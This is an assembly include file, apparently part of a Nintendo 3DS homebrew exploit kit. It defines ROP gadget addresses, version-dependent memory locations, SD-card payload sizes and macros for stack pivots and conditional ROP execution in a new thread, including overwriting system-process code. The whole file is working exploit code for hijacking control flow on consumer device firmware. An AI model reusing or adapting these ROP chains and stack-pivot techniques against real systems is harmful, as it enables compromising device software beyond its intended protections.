#include "ropkit_ropinclude.s"

#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12-0x14

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
	#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
	#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
#endif

#ifndef LOADSDPAYLOAD
	#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
#else
	#if NEW3DS==0
		#define CODEBINPAYLOAD_SIZE 0x4000
	#else
		#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
			#define CODEBINPAYLOAD_SIZE 0x4000
		#else
			#define CODEBINPAYLOAD_SIZE 0x6000
		#endif
	#endif
#endif

#define NEWTHREAD_ROPBUFFER 0x0ff00000

#define MAINLR_SVCEXITPROCESS 0x00100020 //LR of main(), svcExitProcess.

.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
.word POP_R2R6PC
.word 0 @ r2
.word 0 @ r3
.word ROPBUFLOC(stackpivot_pcloadword) @ r4
.word 0 @ r5
.word 0 @ r6
.endm

.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP_NEWTHREAD
.word POP_R2R6PC
.word 0 @ r2
.word 0 @ r3
.word NEWTHREAD_ROPBUFFER + ((newthread_rop_stackpivot_pcloadword) - newthread_ropstart) @ r4
.word 0 @ r5
.word 0 @ r6
.endm

.macro ROPMACRO_STACKPIVOT_JUMP
.word STACKPIVOT_ADR
.endm

#ifndef ROP_POPR3_ADDSPR3_POPPC
.macro ROPMACRO_STACKPIVOT_PREPARE_NEWTHREAD sp, pc
@ Write to the word which will be popped into sp.
ROPMACRO_WRITEWORD NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart), \sp

@ Write to the word which will be popped into pc.
ROPMACRO_WRITEWORD NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart), \pc
.endm
#endif

.macro ROPMACRO_STACKPIVOT_NEWTHREAD sp, pc
ROPMACRO_STACKPIVOT_PREPARE_NEWTHREAD \sp, \pc

ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP_NEWTHREAD

ROPMACRO_STACKPIVOT_JUMP
.endm

.macro ROPMACRO_CMPDATA_NEWTHREAD cmpaddr, cmpword, stackaddr_cmpmismatch
ROP_SETLR ROP_POPPC

ROP_LOADR0_FROMADDR \cmpaddr

ROP_SETR1 \cmpword

#ifdef ROP_CMPR0R1
.word ROP_CMPR0R1
.word 0
#elif defined (ROP_CMPR0R1_ALT0)
.word ROP_CMPR0R1_ALT0
#else
#error "ROP_CMPR0R1* isn't defined."
#endif

ROPMACRO_STACKPIVOT_PREPARE_NEWTHREAD \stackaddr_cmpmismatch, ROP_POPPC

ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP_NEWTHREAD

ROP_SETR0 NEWTHREAD_ROPBUFFER + (newthread_ropkit_cmpobject - newthread_ropstart)

.word ROP_EQBXLR_NE_CALLVTABLEFUNCPTR @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise call the vtable funcptr which then does the stack-pivot.
.endm

